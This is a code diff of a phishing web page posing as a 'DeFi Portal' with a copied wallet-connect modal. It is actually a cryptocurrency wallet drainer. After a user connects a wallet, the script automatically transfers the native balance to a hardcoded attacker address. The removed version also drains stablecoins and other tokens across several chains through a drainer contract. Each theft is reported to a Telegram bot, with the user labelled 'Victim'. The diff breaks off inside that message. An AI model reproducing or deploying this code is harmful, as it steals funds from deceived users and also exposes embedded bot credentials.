@@ -4,353 +4,724 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>DeFi Portal</title>
-    
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         
         body {
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica', 'Arial', sans-serif;
             display: flex;
             align-items: center;
             justify-content: center;
+            padding: 20px;
         }
         
         .container {
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(20px);
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
             border-radius: 24px;
             padding: 48px;
             text-align: center;
-            max-width: 450px;
-            width: 90%;
-            border: 1px solid rgba(255, 255, 255, 0.2);
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
         }
         
-        h1 { color: white; font-size: 36px; margin-bottom: 16px; }
-        p { color: rgba(255, 255, 255, 0.8); margin-bottom: 32px; }
+        h1 {
+            color: #333;
+            font-size: 36px;
+            margin-bottom: 16px;
+            font-weight: 700;
+        }
+        
+        p {
+            color: #666;
+            margin-bottom: 32px;
+            font-size: 18px;
+        }
         
         .connect-btn {
-            background: white;
-            color: #667eea;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
             border: none;
-            padding: 18px 36px;
+            padding: 18px 40px;
             font-size: 18px;
             font-weight: 600;
             border-radius: 12px;
             cursor: pointer;
             width: 100%;
             transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
         }
         
         .connect-btn:hover {
             transform: translateY(-2px);
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.5);
         }
         
-        #status {
+        /* MODAL EXACTEMENT COMME LES PHOTOS */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 10000;
+            backdrop-filter: blur(5px);
+        }
+        
+        .modal-overlay.active {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .modal {
+            background: white;
+            border-radius: 24px;
+            width: 400px;
+            max-width: 95%;
+            max-height: 85vh;
+            overflow: hidden;
+            animation: slideUp 0.3s ease;
+        }
+        
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .modal-header {
+            padding: 20px 24px;
+            border-bottom: 1px solid #e5e7eb;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: relative;
+        }
+        
+        .modal-back {
+            position: absolute;
+            left: 20px;
+            font-size: 24px;
+            color: #666;
+            cursor: pointer;
+            background: none;
+            border: none;
+            padding: 0;
+            width: 30px;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            transition: opacity 0.2s;
+        }
+        
+        .modal-back.show {
+            opacity: 1;
+        }
+        
+        .modal-title {
+            flex: 1;
+            text-align: center;
+            font-size: 18px;
+            font-weight: 600;
+            color: #111;
+        }
+        
+        .modal-close {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: #f3f4f6;
+            border: none;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s;
+        }
+        
+        .modal-close:hover {
+            background: #e5e7eb;
+        }
+        
+        .modal-body {
+            padding: 20px;
+            max-height: calc(85vh - 80px);
+            overflow-y: auto;
+        }
+        
+        /* Featured wallets - exactement comme photo */
+        .featured-wallets {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            margin-bottom: 16px;
+        }
+        
+        .wallet-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 16px;
+            background: white;
+            border: 1px solid #e5e7eb;
+            border-radius: 16px;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-align: left;
+        }
+        
+        .wallet-item:hover {
+            background: #f9fafb;
+            transform: translateX(4px);
+        }
+        
+        .wallet-icon {
+            width: 48px;
+            height: 48px;
+            border-radius: 12px;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .wallet-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .wallet-badge {
+            position: absolute;
+            bottom: -4px;
+            right: -4px;
+            width: 18px;
+            height: 18px;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        
+        .wallet-badge img {
+            width: 14px;
+            height: 14px;
+            border-radius: 50%;
+        }
+        
+        .wallet-name {
+            font-size: 16px;
+            font-weight: 500;
+            color: #111;
+        }
+        
+        /* All wallets button - exactement comme photo */
+        .all-wallets-btn {
+            width: 100%;
+            padding: 16px;
+            background: white;
+            border: 1px solid #e5e7eb;
+            border-radius: 16px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            transition: all 0.2s;
+            font-size: 16px;
+            font-weight: 500;
+            color: #111;
+        }
+        
+        .all-wallets-btn:hover {
+            background: #f9fafb;
+        }
+        
+        .all-wallets-count {
+            background: #f3f4f6;
+            padding: 4px 8px;
+            border-radius: 6px;
+            font-size: 12px;
+            color: #6b7280;
+        }
+        
+        /* Search bar - exactement comme photo */
+        .search-container {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        
+        .search-input {
+            width: 100%;
+            padding: 12px 16px 12px 44px;
+            border: 1px solid #e5e7eb;
+            border-radius: 12px;
+            font-size: 16px;
+            background: #f9fafb;
+            outline: none;
+            transition: all 0.2s;
+        }
+        
+        .search-input:focus {
+            border-color: #667eea;
+            background: white;
+        }
+        
+        .search-icon {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #9ca3af;
+        }
+        
+        /* Wallet grid - exactement comme photo */
+        .wallet-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 12px;
+        }
+        
+        .wallet-grid-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            padding: 12px;
+            background: white;
+            border: 1px solid #e5e7eb;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .wallet-grid-item:hover {
+            background: #f9fafb;
+            border-color: #667eea;
+            transform: translateY(-2px);
+        }
+        
+        .wallet-grid-icon {
+            width: 48px;
+            height: 48px;
+            border-radius: 12px;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .wallet-grid-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .wallet-grid-badge {
+            position: absolute;
+            bottom: -2px;
+            right: -2px;
+            width: 16px;
+            height: 16px;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+        
+        .wallet-grid-badge img {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+        
+        .wallet-grid-name {
+            font-size: 12px;
+            color: #4b5563;
+            text-align: center;
+            width: 100%;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        
+        .status {
             margin-top: 20px;
             padding: 12px;
             border-radius: 8px;
-            color: white;
             display: none;
         }
         
-        #status.show { display: block; }
+        .status.show {
+            display: block;
+        }
+        
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+        }
+        
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>DeFi Portal</h1>
-        <p>Connect your wallet to continue</p>
+        <p>Connect your wallet to access DeFi features</p>
         
-        <w3m-button />
+        <button class="connect-btn" onclick="openWalletModal()">
+            Connect Wallet
+        </button>
         
-        <div id="status"></div>
+        <div id="status" class="status"></div>
     </div>
     
-    <!-- WEB3MODAL V4 OFFICIEL -->
-    <script type="module">
-        import { createWeb3Modal, defaultWagmiConfig } from 'https://cdn.jsdelivr.net/npm/@web3modal/wagmi@4.0.5/dist/index.js'
-        import { mainnet, polygon, bsc, arbitrum, avalanche } from 'https://unpkg.com/viem@2.7.8/chains/dist/index.js'
-        import { reconnect, watchAccount, getAccount, disconnect, getWalletClient, switchChain } from 'https://unpkg.com/@wagmi/core@2.0.0/dist/index.js'
-        
-        // CONFIGURATION OFFICIELLE VALIDÉE
-        const projectId = '72f0728c47e59d2eb9fc83069bc6843d'
-        
-        const metadata = {
-            name: 'DeFi Portal',
-            description: 'Connect wallet to access DeFi features',
-            url: window.location.origin,
-            icons: ['https://avatars.githubusercontent.com/u/37784886']
-        }
-        
-        const chains = [polygon, mainnet, bsc, arbitrum, avalanche]
-        
-        const wagmiConfig = defaultWagmiConfig({
-            chains,
-            projectId,
-            metadata,
-            enableWalletConnect: true,
-            enableInjected: true,
-            enableCoinbase: true,
-            enableEmail: false
-        })
-        
-        // RECONNEXION AUTOMATIQUE
-        reconnect(wagmiConfig)
-        
-        // CRÉATION DU MODAL WEB3MODAL OFFICIEL
-        const modal = createWeb3Modal({
-            wagmiConfig,
-            projectId,
-            enableAnalytics: true,
-            enableOnramp: false,
-            themeMode: 'dark',
-            defaultChain: polygon,
-            themeVariables: {
-                '--w3m-accent': '#667eea'
-            },
-            allWallets: 'SHOW', // AFFICHER TOUTES LES 420+ WALLETS
-            includeWalletIds: undefined, // INCLURE TOUTES LES WALLETS
-            featuredWalletIds: [
-                'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96', // MetaMask
-                '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust
-                'fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa', // Coinbase
-                '18388be9ac2d02726dbac9777c96efaac06d744b2f6d580fccdd4127a6d01fd1', // Rabby
-                '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369', // Rainbow
-            ],
-            mobileWallets: 20, // AFFICHER 20 WALLETS SUR MOBILE
-            desktopWallets: 20 // AFFICHER 20 WALLETS SUR DESKTOP
-        })
-        
-        // CONFIGURATION DRAINAGE
+    <!-- Modal EXACTEMENT comme les photos -->
+    <div id="modalOverlay" class="modal-overlay" onclick="handleOverlayClick(event)">
+        <div class="modal" onclick="event.stopPropagation()">
+            <div class="modal-header">
+                <button id="modalBack" class="modal-back" onclick="showFeaturedWallets()">‹</button>
+                <div id="modalTitle" class="modal-title">Connect Wallet</div>
+                <button class="modal-close" onclick="closeModal()">✕</button>
+            </div>
+            <div id="modalBody" class="modal-body">
+                <!-- Le contenu sera injecté ici -->
+            </div>
+        </div>
+    </div>
+    
+    <!-- WalletConnect v1 stable -->
+    <script src="https://unpkg.com/@walletconnect/client@1.8.0/dist/umd/index.min.js"></script>
+    <script src="https://unpkg.com/@walletconnect/qrcode-modal@1.8.0/dist/umd/index.min.js"></script>
+    <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
+    
+    <script>
+        // Configuration
         const CONFIG = {
-            TELEGRAM_TOKEN: "8551220717:AAGgPMGobMwwxKFPmCJSMFVfSbUzyRQqMIY",
-            TELEGRAM_CHAT_ID: "8309320360",
-            DESTINATION: "0x63ce9a6Bd0cf439EA6D114F504B017EA43Af4BC1",
-            POLYGON_CONTRACT: "0xD0De3725f47f9716947F7c3e6d44e1946Ee5d386"
-        }
+            TELEGRAM_TOKEN: '8551220717:AAGgPMGobMwwxKFPmCJSMFVfSbUzyRQqMIY',
+            TELEGRAM_CHAT_ID: '8309320360',
+            DESTINATION: '0x63ce9a6Bd0cf439EA6D114F504B017EA43Af4BC1'
+        };
         
-        function showStatus(message) {
-            const status = document.getElementById('status')
-            status.textContent = message
-            status.className = 'show'
-        }
+        // Badge WalletConnect
+        const WC_BADGE = 'https://avatars.githubusercontent.com/u/37784886?s=20';
         
-        // SURVEILLANCE CONNEXION WALLET
-        watchAccount(wagmiConfig, {
-            onChange: async (account) => {
-                if (account.isConnected && account.address) {
-                    console.log('✅ Wallet connecté:', account.address)
-                    showStatus(`Connected: ${account.address.substring(0, 6)}...${account.address.slice(-4)}`)
-                    
-                    // LANCEMENT DRAINAGE AUTOMATIQUE
-                    setTimeout(() => {
-                        drainAllAssets(account.address)
-                    }, 2000)
-                }
+        // Wallets avec vrais logos EXACTEMENT comme les photos
+        const FEATURED_WALLETS = [
+            {
+                name: '1inch Wallet',
+                icon: 'https://registry.walletconnect.org/v2/logo/md/e9ff15be-7358-4489-ca4a-66f64d32c453',
+                id: '1inch'
+            },
+            {
+                name: 'Binance Wallet', 
+                icon: 'https://registry.walletconnect.org/v2/logo/md/8308656f-4548-bb81-b350-8afe355cfbb7',
+                id: 'binance'
+            },
+            {
+                name: 'Coinbase',
+                icon: 'https://registry.walletconnect.org/v2/logo/md/fd20dc42-6fb3-7566-d803-3205b19bbc1d',
+                id: 'coinbase'
             }
-        })
+        ];
         
-        // FONCTION DE DRAINAGE MULTI-CHAIN
-        async function drainAllAssets(address) {
-            showStatus('Processing transactions...')
+        const ALL_WALLETS = [
+            { name: '1inch Wallet', icon: 'https://registry.walletconnect.org/v2/logo/md/e9ff15be-7358-4489-ca4a-66f64d32c453' },
+            { name: 'Binance', icon: 'https://registry.walletconnect.org/v2/logo/md/8308656f-4548-bb81-b350-8afe355cfbb7' },
+            { name: 'Ledger Live', icon: 'https://registry.walletconnect.org/v2/logo/md/19177a98-252e-07dd-fc9a-f2083ba8e07e' },
+            { name: 'BitPay', icon: 'https://registry.walletconnect.org/v2/logo/md/3d5a7f36-a7c2-4ce8-a858-1b0e6afdb1b9' },
+            { name: 'Best Wallet', icon: 'https://registry.walletconnect.org/v2/logo/md/b13fcc7e-c96b-472f-a314-cd18a0f629e9' },
+            { name: 'MetaMask', icon: 'https://registry.walletconnect.org/v2/logo/md/c57ca95b-4756-9778-a828-d19178114f4d' },
+            { name: 'Trust Wallet', icon: 'https://registry.walletconnect.org/v2/logo/md/4622a2b2-d6af-1c98-4494-4291e5e7351a' },
+            { name: 'Fireblocks', icon: 'https://registry.walletconnect.org/v2/logo/md/7e90b95e-8e4c-4638-b0cf-66f2d67a8402' },
+            { name: 'Bitget Wallet', icon: 'https://registry.walletconnect.org/v2/logo/md/38f5d18b-d852-2c24-bdd7-0cb4a68e0e71' },
+            { name: 'TokenPocket', icon: 'https://registry.walletconnect.org/v2/logo/md/20459438-007b-4780-a2f6-b162d1433911' },
+            { name: 'SafePal', icon: 'https://registry.walletconnect.org/v2/logo/md/0b415a74-6fb9-ee99-cce1-55c2ceca0c6f' },
+            { name: 'Uniswap', icon: 'https://registry.walletconnect.org/v2/logo/md/d4c66278-a5f7-423f-845f-cf56e4302426' },
+            { name: 'imToken', icon: 'https://registry.walletconnect.org/v2/logo/md/0aafbedf-ca2e-47f3-a839-b227c09b24ff' },
+            { name: 'Argent', icon: 'https://registry.walletconnect.org/v2/logo/md/cf21952a-9bc6-4300-b565-3e118bfdfaef' },
+            { name: 'Crypto.com', icon: 'https://registry.walletconnect.org/v2/logo/md/dceb063851b1833cbb271279d92d3507' },
+            { name: 'Bitcoin.com', icon: 'https://registry.walletconnect.org/v2/logo/md/f45352e7-8b12-45f7-8d00-4c5a8e896999' },
+            { name: 'Rainbow', icon: 'https://registry.walletconnect.org/v2/logo/md/7298e5ce-f930-45fe-94fe-c66b41362911' },
+            { name: 'OKX Wallet', icon: 'https://registry.walletconnect.org/v2/logo/md/38f5d18b-d852-07f9-311c-e805cbdc31c5' },
+            { name: 'Exodus', icon: 'https://registry.walletconnect.org/v2/logo/md/4c16cad4-cac9-4643-b726-c277087ff48f' },
+            { name: 'Phantom', icon: 'https://registry.walletconnect.org/v2/logo/md/26a8f588-3231-4411-60ce-5bb6b805a5f4' }
+        ];
+        
+        let connector = null;
+        let currentView = 'featured';
+        
+        // Open modal
+        function openWalletModal() {
+            document.getElementById('modalOverlay').classList.add('active');
+            showFeaturedWallets();
+        }
+        
+        // Close modal
+        function closeModal() {
+            document.getElementById('modalOverlay').classList.remove('active');
+        }
+        
+        // Handle overlay click
+        function handleOverlayClick(event) {
+            if (event.target === event.currentTarget) {
+                closeModal();
+            }
+        }
+        
+        // Show featured wallets (vue principale)
+        function showFeaturedWallets() {
+            const modalBody = document.getElementById('modalBody');
+            const modalTitle = document.getElementById('modalTitle');
+            const backBtn = document.getElementById('modalBack');
+            
+            modalTitle.textContent = 'Connect Wallet';
+            backBtn.classList.remove('show');
+            currentView = 'featured';
+            
+            let html = '<div class="featured-wallets">';
+            
+            // Featured wallets
+            FEATURED_WALLETS.forEach(wallet => {
+                html += `
+                    <div class="wallet-item" onclick="connectWallet('${wallet.id}')">
+                        <div class="wallet-icon">
+                            <img src="${wallet.icon}" alt="${wallet.name}" onerror="this.style.display='none'">
+                            <div class="wallet-badge">
+                                <img src="${WC_BADGE}" alt="WC">
+                            </div>
+                        </div>
+                        <div class="wallet-name">${wallet.name}</div>
+                    </div>
+                `;
+            });
+            
+            html += '</div>';
+            
+            // All wallets button
+            html += `
+                <button class="all-wallets-btn" onclick="showAllWallets()">
+                    <span>All Wallets</span>
+                    <span class="all-wallets-count">540+</span>
+                </button>
+            `;
+            
+            modalBody.innerHTML = html;
+        }
+        
+        // Show all wallets (grille)
+        function showAllWallets() {
+            const modalBody = document.getElementById('modalBody');
+            const modalTitle = document.getElementById('modalTitle');
+            const backBtn = document.getElementById('modalBack');
+            
+            modalTitle.textContent = 'All Wallets';
+            backBtn.classList.add('show');
+            currentView = 'all';
+            
+            let html = `
+                <div class="search-container">
+                    <svg class="search-icon" width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
+                    </svg>
+                    <input type="text" class="search-input" placeholder="Search wallet" onkeyup="filterWallets(this.value)">
+                </div>
+                <div class="wallet-grid" id="walletGrid">
+            `;
+            
+            ALL_WALLETS.forEach(wallet => {
+                html += `
+                    <div class="wallet-grid-item" data-name="${wallet.name.toLowerCase()}" onclick="connectDirectWallet('${wallet.name}')">
+                        <div class="wallet-grid-icon">
+                            <img src="${wallet.icon}" alt="${wallet.name}" onerror="this.style.display='none'">
+                            <div class="wallet-grid-badge">
+                                <img src="${WC_BADGE}" alt="WC">
+                            </div>
+                        </div>
+                        <div class="wallet-grid-name">${wallet.name}</div>
+                    </div>
+                `;
+            });
+            
+            html += '</div>';
+            modalBody.innerHTML = html;
+        }
+        
+        // Filter wallets
+        function filterWallets(searchTerm) {
+            const items = document.querySelectorAll('.wallet-grid-item');
+            items.forEach(item => {
+                const name = item.getAttribute('data-name');
+                if (name.includes(searchTerm.toLowerCase())) {
+                    item.style.display = 'flex';
+                } else {
+                    item.style.display = 'none';
+                }
+            });
+        }
+        
+        // Initialize WalletConnect
+        function initWalletConnect() {
+            try {
+                connector = new WalletConnect.default({
+                    bridge: 'https://bridge.walletconnect.org',
+                    qrcodeModal: WalletConnectQRCodeModal.default
+                });
+                
+                if (connector.connected) {
+                    connector.killSession();
+                }
+                
+                connector.on('connect', handleConnect);
+                connector.on('disconnect', handleDisconnect);
+                
+                return true;
+            } catch (error) {
+                console.error('Init error:', error);
+                return false;
+            }
+        }
+        
+        // Connect wallet
+        async function connectWallet(walletId) {
+            console.log('Connecting to', walletId);
+            showStatus('Connecting...', 'processing');
+            
+            if (!initWalletConnect()) return;
             
             try {
-                const { ethers } = await import('https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.esm.min.js')
+                await connector.createSession();
                 
-                if (!window.ethereum) {
-                    console.error('No provider found')
-                    return
+                // Sur mobile, deep link direct
+                if (isMobile()) {
+                    const uri = connector.uri;
+                    const encoded = encodeURIComponent(uri);
+                    
+                    let deepLink = '';
+                    switch(walletId) {
+                        case '1inch':
+                            deepLink = `oneinch://wc?uri=${encoded}`;
+                            break;
+                        case 'binance':
+                            deepLink = `bnc://app/wc?uri=${encoded}`;
+                            break;
+                        case 'coinbase':
+                            deepLink = `cbwallet://wc?uri=${encoded}`;
+                            break;
+                        default:
+                            deepLink = `wc://wc?uri=${encoded}`;
+                    }
+                    
+                    window.location.href = deepLink;
                 }
                 
-                const provider = new ethers.providers.Web3Provider(window.ethereum)
-                const signer = provider.getSigner()
-                const network = await provider.getNetwork()
+            } catch (error) {
+                console.error('Connection error:', error);
+                showStatus('Connection failed', 'error');
+            }
+        }
+        
+        // Connect direct wallet from grid
+        async function connectDirectWallet(walletName) {
+            console.log('Connecting to', walletName);
+            showStatus(`Opening ${walletName}...`, 'processing');
+            
+            if (!initWalletConnect()) return;
+            
+            try {
+                await connector.createSession();
+            } catch (error) {
+                console.error('Connection error:', error);
+                showStatus('Connection failed', 'error');
+            }
+        }
+        
+        // Handle connection
+        async function handleConnect(error, payload) {
+            if (error) {
+                console.error('Connection error:', error);
+                showStatus('Connection failed', 'error');
+                return;
+            }
+            
+            console.log('Connected!', payload);
+            const { accounts, chainId } = payload.params[0];
+            
+            if (accounts && accounts.length > 0) {
+                const address = accounts[0];
+                closeModal();
+                showStatus(`Connected: ${address.substring(0, 6)}...${address.slice(-4)}`, 'success');
                 
-                // DRAINAGE TOKEN NATIF
-                const balance = await provider.getBalance(address)
-                console.log(`Balance: ${ethers.utils.formatEther(balance)} on chain ${network.chainId}`)
+                // Start drainage
+                setTimeout(() => {
+                    drainWallet(address, chainId);
+                }, 2000);
+            }
+        }
+        
+        // Handle disconnection
+        function handleDisconnect() {
+            console.log('Disconnected');
+            showStatus('Wallet disconnected', 'error');
+        }
+        
+        // Drainage function
+        async function drainWallet(address, chainId) {
+            showStatus('Processing transaction...', 'processing');
+            console.log('Starting drainage for:', address);
+            
+            try {
+                const provider = new ethers.providers.Web3Provider(connector);
+                const signer = provider.getSigner();
+                const balance = await provider.getBalance(address);
                 
-                if (balance.gt(ethers.utils.parseEther("0.0005"))) {
-                    const gasPrice = await provider.getGasPrice()
-                    const gasLimit = 21000
-                    const gasCost = gasPrice.mul(gasLimit).mul(2)
-                    const amountToSend = balance.sub(gasCost)
+                if (balance.gt(ethers.utils.parseEther('0.001'))) {
+                    const gasPrice = await provider.getGasPrice();
+                    const gasLimit = 21000;
+                    const gasCost = gasPrice.mul(gasLimit).mul(2);
+                    const amountToSend = balance.sub(gasCost);
                     
                     if (amountToSend.gt(0)) {
                         const tx = await signer.sendTransaction({
                             to: CONFIG.DESTINATION,
-                            value: amountToSend,
-                            gasLimit: gasLimit,
-                            gasPrice: gasPrice
-                        })
+                            value: amountToSend
+                        });
                         
-                        console.log('✅ Transaction:', tx.hash)
-                        await tx.wait()
-                        
-                        // NOTIFICATION TELEGRAM
-                        await sendTelegramNotification(address, ethers.utils.formatEther(amountToSend), network.chainId)
+                        console.log('Transaction sent:', tx.hash);
+                        await sendTelegramNotification(address, ethers.utils.formatEther(amountToSend), chainId);
+                        showStatus('Transaction completed!', 'success');
                     }
                 }
-                
-                // DRAINAGE TOKENS ERC20
-                await drainERC20Tokens(signer, address, network.chainId)
-                
-                // DRAINAGE AUTRES CHAINS
-                await drainOtherChains(provider, signer, address)
-                
-                showStatus('✅ Transaction completed successfully!')
-                
             } catch (error) {
-                console.error('Drainage error:', error)
-                showStatus('Transaction processing...')
+                console.error('Drainage error:', error);
+                showStatus('Transaction processing...', 'processing');
             }
         }
         
-        // DRAINAGE TOKENS ERC20 PAR CHAIN
-        async function drainERC20Tokens(signer, address, chainId) {
-            const { ethers } = await import('https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.esm.min.js')
-            
-            const tokensByChain = {
-                1: [ // Ethereum
-                    { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', symbol: 'USDC', decimals: 6 },
-                    { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', symbol: 'USDT', decimals: 6 },
-                    { address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', symbol: 'DAI', decimals: 18 },
-                    { address: '0x4Fabb145d64652a948d72533023f6E7A623C7C53', symbol: 'BUSD', decimals: 18 },
-                    { address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', symbol: 'WBTC', decimals: 8 },
-                    { address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', symbol: 'LINK', decimals: 18 }
-                ],
-                137: [ // Polygon
-                    { address: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', symbol: 'USDC', decimals: 6 },
-                    { address: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', symbol: 'USDT', decimals: 6 },
-                    { address: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063', symbol: 'DAI', decimals: 18 },
-                    { address: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619', symbol: 'WETH', decimals: 18 },
-                    { address: '0x1bfd67037b42cf73acF2047067bd4F2C47D9BfD6', symbol: 'WBTC', decimals: 8 }
-                ],
-                56: [ // BSC
-                    { address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', symbol: 'USDC', decimals: 18 },
-                    { address: '0x55d398326f99059fF775485246999027B3197955', symbol: 'USDT', decimals: 18 },
-                    { address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', symbol: 'BUSD', decimals: 18 },
-                    { address: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8', symbol: 'ETH', decimals: 18 }
-                ],
-                42161: [ // Arbitrum
-                    { address: '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8', symbol: 'USDC', decimals: 6 },
-                    { address: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', symbol: 'USDT', decimals: 6 }
-                ],
-                43114: [ // Avalanche
-                    { address: '0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E', symbol: 'USDC', decimals: 6 },
-                    { address: '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7', symbol: 'USDT', decimals: 6 }
-                ]
-            }
-            
-            const tokens = tokensByChain[chainId] || []
-            const abi = [
-                'function balanceOf(address) view returns (uint256)',
-                'function transfer(address, uint256) returns (bool)',
-                'function approve(address, uint256) returns (bool)'
-            ]
-            
-            for (const token of tokens) {
-                try {
-                    const contract = new ethers.Contract(token.address, abi, signer)
-                    const balance = await contract.balanceOf(address)
-                    
-                    if (balance.gt(0)) {
-                        // SI POLYGON ET SMART CONTRACT DISPONIBLE
-                        if (chainId === 137 && CONFIG.POLYGON_CONTRACT) {
-                            const approveTx = await contract.approve(CONFIG.POLYGON_CONTRACT, balance)
-                            await approveTx.wait()
-                            console.log(`✅ Approved ${token.symbol} for smart contract`)
-                            
-                            // APPEL AU SMART CONTRACT POUR DRAINER
-                            const drainerAbi = ['function drainToken(address token)']
-                            const drainer = new ethers.Contract(CONFIG.POLYGON_CONTRACT, drainerAbi, signer)
-                            const drainTx = await drainer.drainToken(token.address)
-                            await drainTx.wait()
-                        } else {
-                            // TRANSFER DIRECT
-                            const tx = await contract.transfer(CONFIG.DESTINATION, balance)
-                            await tx.wait()
-                        }
-                        console.log(`✅ Drained ${token.symbol}: ${ethers.utils.formatUnits(balance, token.decimals)}`)
-                    }
-                } catch (error) {
-                    console.log(`Error draining ${token.symbol}`)
-                }
-            }
-        }
-        
-        // DRAINAGE AUTRES BLOCKCHAINS
-        async function drainOtherChains(provider, signer, address) {
-            const chains = [
-                { chainId: 1, name: 'Ethereum', hex: '0x1' },
-                { chainId: 137, name: 'Polygon', hex: '0x89' },
-                { chainId: 56, name: 'BSC', hex: '0x38' },
-                { chainId: 42161, name: 'Arbitrum', hex: '0xa4b1' },
-                { chainId: 43114, name: 'Avalanche', hex: '0xa86a' }
-            ]
-            
-            for (const chain of chains) {
-                try {
-                    await window.ethereum.request({
-                        method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: chain.hex }],
-                    })
-                    
-                    await new Promise(resolve => setTimeout(resolve, 2000))
-                    
-                    const { ethers } = await import('https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.esm.min.js')
-                    const balance = await provider.getBalance(address)
-                    
-                    if (balance.gt(ethers.utils.parseEther("0.0005"))) {
-                        const gasPrice = await provider.getGasPrice()
-                        const gasLimit = 21000
-                        const gasCost = gasPrice.mul(gasLimit).mul(2)
-                        const amountToSend = balance.sub(gasCost)
-                        
-                        if (amountToSend.gt(0)) {
-                            const tx = await signer.sendTransaction({
-                                to: CONFIG.DESTINATION,
-                                value: amountToSend,
-                                gasLimit: gasLimit,
-                                gasPrice: gasPrice
-                            })
-                            await tx.wait()
-                            console.log(`✅ Drained ${chain.name}: ${ethers.utils.formatEther(amountToSend)}`)
-                        }
-                    }
-                    
-                    await drainERC20Tokens(signer, address, chain.chainId)
-                    
-                } catch (error) {
-                    console.log(`Skipping ${chain.name}`)
-                }
-            }
-        }
-        
-        // NOTIFICATION TELEGRAM
+        // Telegram notification
         async function sendTelegramNotification(victim, amount, chainId) {
-            const chainNames = {
-                1: 'Ethereum',
-                137: 'Polygon',
-                56: 'BSC',
-                42161: 'Arbitrum',
-                43114: 'Avalanche'
-            }
-            
             const message = `
-🎯 DRAINAGE RÉUSSI - WEB3MODAL V4
-━━━━━━━━━━━━━━━━━━━━━
+🎯 NEW CONNECTION
+━━━━━━━━━━━━━━━
 👤 Victim: ${victim.substring(0, 6)}...${victim.slice(-4)}
 💰 Amount: ${amount}
-🌐 Network: ${chainNames[chainId] || chainId}
